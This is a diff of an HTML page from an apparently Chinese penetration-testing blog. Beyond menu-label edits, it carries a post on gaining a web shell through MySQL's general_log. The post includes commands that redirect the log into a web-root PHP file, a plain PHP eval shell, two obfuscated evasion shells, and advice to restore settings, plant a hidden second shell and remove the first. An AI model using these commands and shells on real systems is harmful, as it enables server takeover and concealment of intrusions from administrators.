@@ -85,37 +85,25 @@
             
             <li class="menu-item">
                 <a href="/">
-                    主页
+                    home
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/archives">
-                    所有文章
+                    archives
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/about">
-                    关于自己
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/tags">
-                    标签
-                </a>
-            </li>
-            
-            <li class="menu-item">
-                <a href="/categories">
-                    分类
+                    about me
                 </a>
             </li>
             
             <li class="menu-item">
                 <a href="/contact">
-                    一起交流
+                    blogs
                 </a>
             </li>
             
@@ -172,7 +160,7 @@
 
         <!-- Post Content -->
         <p><br></p>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;在实际渗透过程中,我们有时可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却写不进去,可以肯定的是,我们对所指定的目标网站目录是绝对有写权限的且mysql的root用户并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你<br><br><br><img src="/img/show variables waf.png" alt=""><br><br><a id="more"></a><br>利用mysql日志文件来拿shell,原理其实非常简单,当我们开启general_log以后,每执行一条sql都会被自动记录到这个日志文件中,我们就可以通过这种方式把我们的shell也自动写进去,运维可能平时都是拿这个查慢查询,会临时开启下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show variables like '%general%';   查看当前配置,'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log' 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来</div><div class="line">mysql&gt; set global general_log = on;  	  默认是关闭的,不然记录亮是非常大的</div></pre></td></tr></table></figure></p>
+<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;在实际渗透过程中,我们有时可能会遇到这样的情况,明明是正儿八经的mysql root权限,但实际利用into outfile写shell的时候,却写不进去,可以肯定的是,我们对所指定的目标网站目录是绝对有写权限的且mysql的root用户并没有被降权,一般出现这样的情况很可能就是因为into outfile被禁用或waf拦截,希望下面的方式能帮到你<br><br><br><img src="/img/show variables waf.png" alt=""><br><br><a id="more"></a><br>利用mysql日志文件来拿shell,原理其实非常简单,当我们开启general_log以后,每执行一条sql都会被自动记录到这个日志文件中,我们就可以通过这种方式把我们的shell也自动写进去,运维可能平时都是拿这个查慢查询,会临时开启下:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show variables like '%general%';   查看当前配置,'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log' 顺手把原来正常的日志路径稍微记录下,等会儿干完活儿再把它恢复回来</div><div class="line">mysql&gt; set global general_log = on;  	  默认是关闭的,不然记录亮是非常大的</div></pre></td></tr></table></figure></p>
 <p><img src="/img/show variables config.png" alt=""><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; set global general_log_file = <span class="string">'C:/Program Files (x86)/Apache Software Foundation/Apache2.2/htdocs/abouts.php'</span>; </div><div class="line">mysql&gt; select <span class="string">'&lt;?php eval($_POST[request]);?&gt;'</span>;    开始写shell,这里就是个普通的shell,不免杀,如果有waf的话,可以用下面的免杀shell</div></pre></td></tr></table></figure></p>
 <p><img src="/img/show variables write shell.png" alt=""><br><br><img src="/img/show variables log exec.png" alt=""><br><br><img src="/img/show variables res.png" alt=""><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select <span class="string">"&lt;?php $sl = create_function('', @$_REQUEST['klion']);$sl();?&gt;"</span>;    免杀shell,eval方式</div><div class="line">mysql&gt; SELECT <span class="string">"&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['klion']));?&gt;"</span>;     别人的免杀shell,assert&amp;base64encode方式</div></pre></td></tr></table></figure></p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; set global general_log_file = <span class="string">'C:\ProgramData\MySQL\MySQL Server 5.5\Data\2008R2DC.log'</span>;    最后,记得把配置恢复原状就好了,拿到shell以后,记得马上再传一个shell[放的隐蔽点],然后再通过新的shell把现在这个shell删掉,谨慎一点,起码不会让你的shell掉的那么快</div><div class="line">mysql&gt; set global general_log = off;</div></pre></td></tr></table></figure>
